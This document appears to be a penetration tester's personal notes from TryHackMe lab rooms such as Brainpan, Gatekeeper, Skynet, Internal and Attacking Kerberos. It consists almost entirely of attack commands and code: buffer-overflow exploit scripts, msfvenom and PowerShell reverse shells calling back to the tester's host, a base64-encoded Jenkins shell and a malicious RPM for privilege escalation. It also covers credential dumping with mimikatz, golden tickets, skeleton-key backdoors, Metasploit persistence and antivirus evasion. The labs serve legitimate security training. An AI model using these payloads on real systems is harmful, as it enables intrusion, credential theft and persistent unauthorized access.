	#badchar
!mona bytearray -b "\x00"
!mona compare -f bytearraybin -a 0192fa30
\x00\
	##find right module
!mona modules
!mona find -s "\xff\xe4" -m essfunc.dll -cpb "\x00\x0a"
0x62501535
	##find and write exploit
set processor
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=10.1.1.88 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
nc -lvp 4242
>cd ..\..\
>cd ..\Users\drake\Desktop
>type root.txt






Brainpan 1 tryhackme
====================================
nmap -p- -Pn 10.10.1.126
dirb http://10.10.1.126:10000
http://10.10.1.126:10000/bin
http://10.10.1.126:10000/bin/brainpan.exe
nc 10.10.1.126 9999
	#exploit buffer overflow to my windows machine
	##fuzzing
while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((""10.1.1.87",9999))
		s.recv(4098)
		s.send(buf)
		s.recv(4098)
		s.send(buf)
		s.close()
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		else
			buf=buf+'A'*1000
		print "send %s bytes" % (len(buf))
	except:
		print "gagal"
		sys.exit()
	##ofset
msf-pattern_create -l 1000
msf-pattern_offset -q  35724134
524
	##badchar
for x in range (1,256):
	print ("\\x"+"{:02x}".format(x),end='')
print()
!mona bytearray -b "\x00"
!mona compare -f bytearray.bin -a 0192fa30
\x00\
\x00
	#module
!mona modules
!mona find -s 
!mona find -s "\xff\xe4" -m brainpan.exe -cpb "\x00"
0x311712f3
	#shell
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
Z:\Users\puck
actually linux box with wine to run exe
msfvenom -p linux/x86/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
	#exploit
buf='A'*524
eip=struct.pack("<I",0x311712f3)
shell=("")
nop="\x90"*16
esp='C'*(1000-524-4-16-len(shell))
buffer=buf+eip+nop+shell+esp
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>sudo -l
(root) NOPASSWD /home/anansi/bin/anansi_util
>lsb_release -a
>sudo /home/anansi/bin/anansi_util
>sudo /home/anansi/bin/anansi_util manual
	#actually manual man privesc
	#gtfobin man
>sudo /home/anansi/bin/anansi_util man bash
>!/bin/sh
#cat /root/b.txt








Gatekeeper Tryhackme
====================================
	##error vcruntime140.dll
https://answers.microsoft.com/en-us/windows/forum/windows_10-update/vcruntime140dll/b1a15b0e-e389-41a3-bc49-f4fc85bac575?auth=1
https://www.microsoft.com/en-us/download/details.aspx?id=52685
	##install Microsoft Visual C++ both 32bit and 64bit and restart
	##this issue takes fcking two days until I found this article
smblient //10.10.28.129/Users
>cd Share
>get gatekeeper.exe

offset 146
badchar \x00\x0a
!mona modules
!mona find -s 
!mona find -s "\xff\xe4" -m brainpan.exe -cpb "\x00\x0a"
eip=0x080416bf
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
buf='A'*146
eip=struct.pack("<I",0x080414c3)
nop='\x90'*32
shell=()
esp='C'*(500-146-4-32-2-len(shell))
buffer=buf+eip+nop+shell+esp
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((""10.10.150.172",31337))
	s.send(buffer+"\r\n")
	s.recv(4098)
	s.send(buf)
	s.close()
except:
	print "gagal"
	sys.exit()

nc -lvp 4242
>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.4.11.80',4141);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
nc -lvp 4141
>$client = new-object System.Net.WebClient
>$client.DownloadFile("http://10.4.11.80/winPEASx64.exe","C:\Users\natbat\Desktop\win.exe")
>win.exe cmd > out.txt
	##seatbelt windows using precompile binnaries
	##https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt
>$client.DownloadFile("http://10.4.11.80/SeatbeltNet3.5AnyCPU.exe","C:\Users\natbat\Desktop\seatbelt.exe")
>seatbelt.exe all
>cd ../
	##show hidden
>dir /a
>dir /a:h /b /s
mkdir firefox
impacket-smbserver asd firefox/
>cd C:\Users\netnat\Appdata\Roaming\Mozilla\Firefox\Profiles\dajn1iou.default-release
>copy * \\10.4.11.80\asd\
wget https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
python3 firefox_decrypt.py firefox/
	##got credz mayor:8CL701nasbBoCIsV
rdesktop -u mayor -p 8CL701nasbBoCIsV 10.10.43.205
locate psexec.py
python3 psexec.py mayor:8CL701nasbBoCIsV@10.10.43.205
python3 psexec.py gatekeeper/mayor:8CL701nasbBoCIsV@10.10.43.205





Blue tryhackme
====================================
python3 autrecon.py 10.10.59.185
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set rhost 10.10.59.185
set lhost 10.4.11.80
set payload windows/x64/shell/reverse_tcp
run
>ctrl^Z
>use post/multi/manage/shell_to_meterpreter
>set session 1
>run
>session -i 2
>ps
	#migrate to have more stable process and match thearchitechture of process
	#pid 1270 spoolsv.exe is printer program that save process and match the architechture
>migrate 1270
>getuid
>hashdump
	#got credz Jon:1000:hash
john jon.hash --format=NT --wordlist=/opt/rockyou.txt
john jon.hash --format=NT --show
	#got credz jon:alqfna22
>shell
>dir flag2.txt /s /p
	#flag /s to search /p to display in one page
	#Blue without metasploit
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
pip --version
pip install -r req.txt
python3 eternal_checker.py 10.10.19.188







Vulnversity tryhackme
====================================
nmap -sV 10.10.18.193
gobuster dir -u http://10.10.18.193 -w /usr/share/wordlist
http://10.10.18.193/internal
	#upload php shell with .phtml extention
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
	#SUID /bin/systemctl
>cat asd.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.4.11.80/1111 0>/&1'
[Install]
WantedBy=multi-user.target
>systemctl enable asd.service
nc -lvp 1111
>systemctl start asd.service






Kenobi Tryhackme
====================================
python3 autorecon.py 10.10.130.78
nc 10.10.130.78 21
searchsploit proftpd 1.3.5
searchsploit -m 36742
nc 10.10.130.78 21
>site help
>site cpfr /etc/passwd
>site cpto /var/www/html/passwd.bak
>site cpto /var/tmp/passwd.bak
>site cpfr /home/kenobi/.ssh/id_rsa
>site cpto /var/tmp/id_rsa
mkdir mnt
sudo mount 10.10.130.78:/var mnt/
cp mnt/tmp/id_rsa .
chmod 600 id_rsa
ssh kenobi@10.10.130.78 -i id_rsa
find / -perm -4000 -type f 2>/dev/null
	#SUID /usr/bin/menu
/usr/bin/menu
strings /usr/bin/menu
cp /bin/sh /home/kenobi/ifconfig
chmod 777 ifconfig
export PATH=/home/kenobi:$PATH
/usr/bin/menu








Steel Mountain Tryhackme
====================================
python3 autorecon.py 10.10.167.126
searhsploit http file server 2.3
searchsploit -m 49584
python3 49584.py
nc -lvp 4242
>whoami
impacket-smbserver asd .
>copy //10.4.11.80/asd/PowerUp.ps1 .
>. .\PowerUp.ps1
>.\PowerUp.ps1
>Invoke-AllChecks
>powershell -c Get-Service
	#privsc weak file permission
	#service AdvanceSystemCareService9 writable and restart yes
msfvenom -p windows/shell_reverse_tcp lhost=10.4.11.80 lport=4141 exitfunc=thread -f exe -a x86 -o Advance.exe
>cd "C:\Program Files (x86)\IObit\Advanced SystemCare\"
>copy \\10.4.11.80\asd\Advance.exe
>copy ASCService.exe C:\Users\bill\
>net stop AdvanceSystemCareService9
>copy Advance.exe ASCService.exe
nc -lvp 4141
>net start AdvanceSystemCareService9
type C:\Users\Administartor\Desktop\root.txt







Alfred Tryhackme
====================================
nmap -p- --min-rate 10000 -Pn 10.10.155.221
http://10.10.155.221:8080
	#login as admin:admin
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
python -m SimpleHTPPServer 80
	#go to project -> configure -> change build command -> save -> build now	
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.11.80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.11.80 -Port 4242
rlwrap nc -lvp 4242
>whoami
	#alfred/bruce
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.4.11.80 lport=4141 -f exe -o shell.exe
>powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.4.11.80/shell.exe','shell.exe')"
msfconsole
use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.4.11.80 set lport 4141 run
>Start-Process shell.exe
>whoami /priv
	#privsc token impersonate
	#SeDebugPriviledge and SeImpersotanePriviledge
>list_tokens -g
	#there is BUILDIN\Administrators token
>impersonate_token "BUILDIN\Administrators"
>getuid
>ps
	#migrate to services.exe process
>migrate 668
>getuid
>cd "C:\Windows\System32\config"
>cat root.txt
	#privsc without metasploit
impacketsmbserver asd .
>copy \\10.4.11.80\asd\incognito.exe
>incognito.exe list_tokes -u
>incognito.exe add_user lucas lucas
>net user lucas
>incognito.exe add_localgroup_user Administrators lucas
>net user lucas
rdesktop -u lucas -p lucas 10.10.155.221







Hackpark Tryhackme
====================================
nmap -p- --min-rate 10000 10.10.240.62
dirb http://10.10.240.62
http://10.10.240.62/admin
http://10.10.240.62/Account/login.aspx?ReturnURL=/admin
hydra -l admin -P /opt/rockyou.txt 10.10.240.62 http-post-form 'url:body-parameter:response'
hydra -l admin -P /opt/rockyou.txt 10.10.240.62 http-post-form '/Account/login.aspx?Return%2admin:__VIEWSTATE.....%24UserName=^USER^&..%24Password=^PASS^&...:S=Location'
	#got credz admin:1qaz2wsx
searchsploit blogengine 
searchsploit -m 47010
searchsploit -m 46353
https://www.exploit-db.com/exploits/46353
	#exploit blogengine 3.6.0
	#Upload https://www.exploit-db.com/exploits/46353
rlwrap nc -lvp 4242
http://10.10.240.62/?theme=../../App_Data/files
>cd C:\Windows\Temp
python -m SimpleHTTPServer 80
>powershell -c "Invoke-WebRequest -Uri '10.4.11.80/shell.exe' -OutFile 'shell.exe'"
msfconsole
use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.4.11.80 set lport 4242 run
>.\shell.exe
>getuid
>ps
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
pip install xlrd=1.2.0
>systeminfo > systeminfo-hackpark.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2021-08-29.xls --systeminfo systeminfo-hackpark.txt
>powershell -c "Invoke-WebRequest -Uri '10.4.11.80/winPEASany.exe' -OutFile 'winpeas.exe'"
>.\winpeas.exe
	#binary hijacking non microsoft service
	#binary at C:\Program Files (x86)\SystemScheduler
>tasklist /svc | findstr /i windowsscheduler
>cd C:\Program Files (x86)\SystemScheduler\Events
>type 20198415519.INI_LOG.txt
	#inject Message.exe binary
>powershell -c "Invoke-WebRequest -Uri '10.4.11.80/shell.exe' -OutFile 'shell.exe'"
>copy Message.exe C:\Windows\Temp\Message.exe.bak
>copy /Y shell.exe Message.exe
backgroud
sessions -l
run
>getuid







Gamezone Tryhackme
===================================
	#OS detection from PING
Unix/Linux	- TTL 64
Windows		- TTL 128
Solaris/AIX	- TTL 254
nmap --min-rate 10000 10.10.98.209 -p- -Pn
http://10.10.98.209
	#try login -> intercept with burp -> google sql authentication bypass -> attack with intruder on user parameter
	#login with user admin'or'1'='1'#
http://10.10.98.209/portal.php
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D db --dump-all --batch
	#got credz agent47:videogamer124
ssh agent47@10.10.98.209
>netstat -lntp
	#ssh tunnel
	#exploit webmin 1.580
>~C
>-L 10000:localhost:10000
http://localhost:10000
>python -V
msfconsole
search webmin
use exploit/unix/webapp/webmin_show_cgi_exec
set username agent47
set password videogamer124
set rhost 127.0.0.1
set ssl false
show payloads
set payload cmd/unix/reverse_python
run
sessions -l
sessions -i 1
	#exploit webmin without metasploit
wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py
	#change lhost, lport, user, password
python3 web.py "localhost:10000"
nc -lvp 4141






Skynet Tryhackme
=====================================
nmap -p- --min-rate 10000 10.10.205.24 -Pn
python3 autorecon.py 10.10.205.24
smbclient \\10.10.205.24\anonymous
>mask ""
>recurse ON
>prompt OFF
>mget *
gobuster dir -u http://10.10.205.24/ -w /usr/share/wordlist/dirb/small.txt
http://10.10.205.24/squirrelmail
	#bruteforce with user milesdyson
smbclient -L 10.10.205.24
smbclient \\\\10.10.205.24\\milesdyson
>get important.txt
http://10.10.205.24/45kra24zxs28v3yd
gobuster dir -u http://10.10.205.24/45kra24zxs28v3yd -w /usr/share/wordlist/dirb/small.txt
http://10.10.205.24/45kra24zxs28v3yd/administrator
	#exploit cuppa CMS
searchsploit cuppa
searchsploit -m 25971
http://10.10.205.24/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
http://10.10.67.236/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
python -m SimpleHTTPServer 80
http://10.10.205.24/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.11.80/rev.php
nc -lvp 4242
>cat /etc/crontab
>cat /home/milesdyson/backups/backup.sh
>cd /var/www/html
	#tar privesc
>printf '#!/bin/bash\nbash -i >& /dev/tcp/10.4.11.80/4141 0>&1' > /var/www/html/x.sh
>echo "/bin/bash -c 'bash -i >& /dev/tcp/10.4.11.80/4141 0>&1'" > x.sh
>chmod 777 x.sh
>touch /var/www/html/--checkpoint=1
>touch /var/www/html/--checkpoint-action=exec=bash\ shell
	#another touch method
>touch "./--checkpoint=1"
>touch "./--checkpoint-action=exec=bash x.sh"
>tar cf a.tgz *
nc -lvp 4141







DailyBugle Tryhackme
===================================
nmap -p- -Pn --min-rate 10000 10.10.88.131
http://10.10.88.131
sudo apt-get install joomscan
joomscan -u http://10.10.88.131 -ec
	#exploit joomla 3.7 SQLi
searchsploit joomla 3.7
searchsploit -m 42033
sqlmap -u "http://10.10.88.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
git clone https://github.com/stefanlucas/Exploit-Joomla
python joomblah.py http://10.10.88.131
	#search hash
sudo pip install hashid
hashid hash.txt
john hash.txt --wordlist=/opt/rockyou.txt
john hash.txt --show
	#login joomla
	#joomla reverse shell
	#template>templates>select template>change index.php>template preview
nc -lvp 4242
>cd /var/www/html
>cat configuration.php
	#got credz mysql:root:nv5uz9r3ZEDzVjNu
>cat /etc/passwd | grep -v nologin
ssh jjameson@10.10.88.131
>sudo -l
	#yum privsc
git clone https://github.com/jordansissel/fpm
cd fpm
sudo gem install fpm
sudo apt-get install rpm
echo "bash -i >& /dev/tcp/10.4.11.80/4141 0>&1" > rootrev.sh
>which bash
echo "cp /usr/bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> rootrev.sh
fpm -n root -s dir -t rpm -a all --before-install rootrev.sh .
>wget 10.4.11.80/root-1.0-1.noarch.rpm
>sudo yum localinstall -y root-1.0-1.noarch.rpm
>sudo dnf install -y root-1.0-1.noarch.rpm
nc -lvp 4141
>/tmp/rootbash -p







Overpass2hacked Tryhackme
====================================
git clone https://github.com/NinjaJc01/ssh-backdoor
cat ssh-backdoor/main.go
	#got hardcoded salt 1c362db83f3fnkjno1o808fonf812
cat hash.txt
hash$salt
hashid hash
	#hash using sha512
john hash.txt --format='dynamic=sha512($p.$s)' --wordlist=/opt/rocyou.txt
	#got password november16
nmap -p- --min-rate 10.10.213.116
ssh james@10.10.213.116 -p 2222
ls -laht
/home/james/.suid_bash -p







Relevant Tryhackme
====================================
python3 autorecon.py 10.10.13.113
gobuster dir -u http://10.10.13.113:49663/ -w /usr/share/wordlist/dirbuster/directory*small*.txt
smbclient \\10.10.13.113\nt4wrksv
>get password.txt
	#got credz but none can login
rdesktop -u Bob -p '!P@$$W0rD!123' 10.10.13.113
evil-winrm -i 10.10.13.113 -u bob -p '!P@$$W0rD!123'
rpcclient -U "Bob" -p 10.10.13.113
xfreerdp /u:bob /d:relevant /p:'!P@$$W0rD!123' /cert:ignore  /v:10.10.13.113
xfreerdp /u:bob /d:relevant /p:'!P@$$W0rD!123' /sec:tls /cert:ignore  /v:10.10.13.113
smbmap -H 10.10.13.113 -u 'Bob' -p '!P@$$W0rD!123'
enum4linux -a u "Bob" -p "!P@$$W0rD!123" 10.10.13.113
crackmapexec smb 10.10.13.113 -d RELEVANT -u bob -p '!P@$$W0rD!123' -x whoami
psexec \\10.10.13.113 -u Bob -p '!P@$$W0rD!123'
psexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113
wmiexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113
dcomexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113
atexec.py relevant/bob:'!P@$$W0rD!123'@10.10.13.113 "whoami"
pth-winexe -U 'Relevant/bob%!P@$$W0rD!123' //10.10.13.113 cmd.exe
	#got directory list same as SMB
wget  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.4.11.80 lport=4242 -f aspx -o shell.aspx
smbclient \\10.10.13.113\nt4wrksv
>put shell.aspx
rlwrap nc -lvp 4242
http://10.10.13.113/nt4wrksv/shell.aspx
>whoami
	#stable powershell ConPtyShell
	#https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
>powershell
>IEX(IWR https//10.4.11.80/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.4.11.80 4444
>Import-Module ConPtyShell.ps1
>invoke-ConPtyshell 10.4.11.80 4444
stty raw -echo; (stty size; cat) | nc -lvnp 4444
>cd C:\inetpub\wwwroot\nt4wrksv\
smbclient \\10.10.13.113\nt4wrksv
>put winpeas.exe
>.\winpeas.exe > out.txt
>get out.txt
>put PowerUp.ps1
>Import-Module PowerUp.ps1
>Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
>get checks.txt
>whoami /priv
	#windows privsc SeImpersonatePrivilege privsc
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
	#trying incognito.exe and JuicyPotato.exe but defender block it
	#https://www.scrawledsecurityblog.com/2020/07/bypassing-windows-defender-antivirus-in.html
	#try bypass by create dir C:\PHP533
>cd C:\
>mkdir PHP5433
>cd PHP5433
>powershell -c "Invoke-WebRequest -Uri 'http://10.4.11.80/incognito.exe' -OutFile 'incognito.exe'"
>.\incognito.exe -h
	#**snip**file contains a virus or potentially unwanted software**snip**
>.\JuciyPotato.exe -h
	#**snip**file contains a virus or potentially unwanted software**snip**
	#privsc using printspoofer	
smbclient \\10.10.13.113\nt4wrksv
>put PrintSpoofer.exe
>.\PrintSpoofer.exe -h
>.\PrintSpoofer.exe -i -c powershell.exe
>.\PrintSpoofer.exe -i -c "nc.exe 10.4.11.80 4141 -e C:\Windows\System32\cmd.exe"
>.\PrintSpoofer.exe -i -c "nc.exe 10.4.11.80 4141 -e cmd.exe"
rlwrap nc -lvp 4141
	#exploit eternalblue
searchsploit eternalblue
searchsploit -m 42315
nano 42315.py
	#change username & passs
	#change def smb_pwn
	#mark print pwned.txt and change into this:
		smb_send_file(smbConn, 'rshell.exe', 'C', '/rshell.exe')
		service_exec(conn, r'c:\rshell.exe')
python 42315.py
	#got error MYSMB
	#download and add to same directory
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
python 42315.py
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.11.80 LPORT=4321 -f exe > rshell.exe
python 42315.py 10.10.13.113
nc -lvp 4321







Internal Tryhackme
===================================
python3 autorecon.py 10.10.38.56
gobuster dir -u internal.thm -w dircertory-list-2.3-small.txt
wpscan --url internal.thm -e u,vp,vt,cb
wpscan --url internal.thm -U admin -P /opt/rockyou.txt
	#got credz admin:my2boys
	#wordpress reverse shell edit template
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
nc -lvp 4242
	#new kali linux stty error reverse shell
	#because new kali linux use zsh
	#check shell
ps -p $$
	#change to bash
exec bash --login
nc -lvp 4242
>wget 10.4.11.80/linpeas.sh
>linpeas.sh | tee linpeas-varwww.txt
>nc 10.4.11.80 1234 < linpeas-varwww.txt
	#phpmyadmin config file
>cd /etc/phpmyadmin
>cat config-db.php
	#got credz phpmyadmin:B2Ud4fEOZmVq
>ls /home
	#find string
>grep -RiIE "aubreanna" / 2>/dev/null
>locate *.txt
>cat /opt/wp-save.txt
	#got credz aubreanna:bubb13guM!@123
ssh aubreanaa@10.10.38.56
>linpeas.sh | tee linpeas-aubreanna.txt
>groups
	#adm groups
>cat /var/log/* | grep -i password
>cat jenkins.txt
	#ssh tunnel 8080
>~C
>-L 8888:localhost:8080
>ifconfig
ssh -L 8888:172.17.0.2:8080 aubreanna@internal.thm
http://localhost:8080
	#hydra bruteforce jenkins
hydra -L user.txt -P /opt/rockyou.txt -s 8888 'localhost' http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from%2F&Submit=Sign+in:F=incalid username"
	#got credz admin:spongebob
http://localhost:8888/script
	#linux reverse shell jerkins script
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
nc -lvp 4444
	#scp transfer kali
>linpeas.sh | tee linpeas-jenkins.txt
sudo service ssh start
>scp linpeas-jenkins.txt kali@10.4.11.80:/tmp
sudo service ssh stop
>grep -RiIE "aubreanna" / 2>/dev/null
>locate *.txt
>cat /opt/note.txt
	#got credz root:tr0ub13guM!@123
>su root





Attacking Kerberos
========================================
ssh administrator@CONTROLLER.local
>whoami
	##enumerate user /w kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 kerbrute
chmod+x kerbrute
wget https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
	##harvest ticket /w rubeus
>Rubeus.exe harvest /interval:30
	##bruteforce with given kerberos
>echo 10.10.188.245 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
>Rubeus.exe brute /password:Password1 /noticket
	##kerberoasting /w rubeus
>Rubeus.exe kerberoast
	#remove remove space characters, form feeds, new-lines, carriage returns, horizontal tabs, and vertical tabs.
cat hash.txt | tr -d '[:space:]' > hashh.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
	##kerberoasting /w impacket
https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
cd Impacket-0.9.19
pip install .
cd /usr/share/doc/python3-impacket/examples/
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.188.245 -request
hashcat -m 13100 -a 0 hash.txt Pass.txt
	##Dumping KRBASREP5 Hashes w/ Rubeus
>Rubeus.exe asreproast
	#Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
hashcat -h | grep kerberoast
hashcat -m 18200 hash.txt Pass.txt
	#download nano windows
wget https://www.nano-editor.org/dist/win32-support/nano-git-0d9a7347243.exe
nv nano-git-0d9a7347243.exe nano.exe
python -m SimpleHTTPServer 80
>certutil -urlcache -split -f http://10.4.11.80/nano.exe C:\Temp\nano.exe
nano.exe C:\Windows\System32\drivers\etc\hosts
	##dump ticket /w mimikatz
>mimikatz.exe
	#check administrator priviledge, if response 20 OK then we can attack
#privilege::debug
#sekurlsa::tickets /export
	##pass the ticket /w mimikatz
#kerberos:ptt [0;1c1df2]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
	#list cache ticket
>klist
>dir \\10.10.188.245\admin$
	##dump krbtgt hash
#privilege::debug
#lsadump::lsa /inject /name:krbtgt
	##create golden ticket
Kerberos::golden /user:Administrator /domain:controller.local /sid:*injected SID* /krbtgt:*NTLM hash* /id:500
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
	##create silver ticket
#lsadump::lsa /inject /name:SQLService
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103
	##use golden ticket
#misc::cmd
>nltest /dclist:CONTROLLER.local
>dir \\CONTROLLER-1.CONTROLLER.local\C$
	##kerberos backdoor /w mimikatz
#privilege::debug
#misc::skeleton
	#create skeleton key with default credential mimikatz
>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
>dir \\Desktop-1\c$ /user:Machine1 mimikatz





attacktivedirectory Tryhackme
====================================
enum4linux -H 10.10.166.66
./kebrute userenum -d spookysec.local --dc spookysec.local userlist.txt
	##asrep roasting = user has priviledge to kerberos ticket without authentication
cat user.txt | cut -d ' ' -f 14 | cut -d '@' -f 1 > usser.txt
./GetNPUsers.py -usersfile usser.txt -no-pass -dc-ip 10.10.166.66 spookysec.local/username
	#when asrep roast with impacket, user is case sensitive, so try to add svc-admin, Svc-admin, SVC-ADMIN
hashcat -m 18200 hash.txt passwordlist.txt
	#got credz svc-admin:management2005
smbmap -H spookysec.local -u 'svc'admin' -p management2005
smbclient \\\\spookysec.local\\backup -U svc-admin
>get backup_credentials.txt
cat backup_credentials.txt | base64 -d
	#got credz backup@spookysec.local:backup2517860
rdesktop -u 'backup' -p 'backup2517860' spookysec.local
	# This account has a unique permission that allows all Active Directory changes to be synced with this user account
	#This includes password hashes
./secretsdump.py -just-dc-ntlm SPOOKYSEC.local/backup:backup2517860@10.10.166.66
	#got credz Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
	##pass the hash
evil-winrm -i 10.10.166.66 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc








Windows Post Exploitation Basic tryhackme
=====================================
ssh Administrator@CONTROLLER
>powershell -ep bypass
>. .\PowerView.ps1
>Get-NetUser | select cn 
>Get-NetGroup -GroupName *admin*
	#shared folder not set by default
>Invoke-ShareFinder
>Get-NetComputer -fulldata | select operatingsystem
	#powershell find file not error output
>get-childitem -force -recurse -erroraction 'silentlycontinue'| findstr .txt
>Get-ChildItem -Path C:\Users -Filter *.txt -Recurse -Force -ErrorAction SilentlyContinue | where { $_.Attributes -match “Hidden”}
	##bloodhound
>. .\Downloads\SharpHound.ps1
>Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
sudo service ssh start
>cp .\20210812090641_loot.zip kali@10.4.11.80:/tmp
sudo service ssh stop
sudo neo4j console
bloodhound
	#import zip file error bad json file
	#drag and drop zip file
	##dump hash /w mimikatz
>mimikatz.exe
#privilege::debug
#lsadump::lsa /patch
	#try dump more than one time, bcs there is different
#lsadump::lsa /patch
hashcat -m 1000 hash.txt /opt/rockyou.txt
	##golden ticket /w mimikatz
	#dump krbtgt hash
#lsadump::lsa /inject /name:krbtgt
	#create golden ticket
#kerberos::golden /user: /domain: /sid: /krbtgt: /id:
#kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
	#use golden ticket
#misc::cmd
#exit
>dir \\Desktop-1\c$
>PsExec.exe \\Desktop-1 cmd.exe
>hostname
	#we can enumerate domain controller with Server Manager
	##mantaining access
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.11.80 LPORT=4321 -f exe -o shell.exe
>certutil -urlcache -split -f http://10.4.11.80/shell.exe C:\Users\Administrator\Download\shell.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp lhost 10.4.11.80 lport 4321
run
>shell.exe
>background
>use exploit/windows/local/persistence
>set payload windows/meterpreter/reverse_tcp
>set lhost 10.4.11.80
>set lport 4321
>set session 1
>run
	#backdoor created will send payload every 10s (default) 
	#and presistent (machine rebooted still backdoor still running)
>use exploit/multi/handler
>set lport 4321
>run





Windows Powershell Scripting tryhackme
========================================
	#get all cmdlets installed on computer
get-command new-*
	#some object may boolean so pipe select-object can be filter
Get-ChildItem mode, name
Get-ChildItem -Property mode, name
	#where-object is actual filter
	#-Contains: if any item in the property value is an exact match for the specified value
    #-EQ: if the property value is the same as the specified value
    #-GT: if the property value is greater than the specified value
Verb-Noun | Where-Object -Property PropertyName -operator Value
Get-Service | Where-Object -property Status -eq Stopped
Get-Service | Where-Object Status -eq Stopped
	#sort-object to sort
Get-ChildItem | Sort-Object
	#find file
Get-ChildItem -Filter *.txt -Recurse -Force -ErrorAction SilentlyContinue
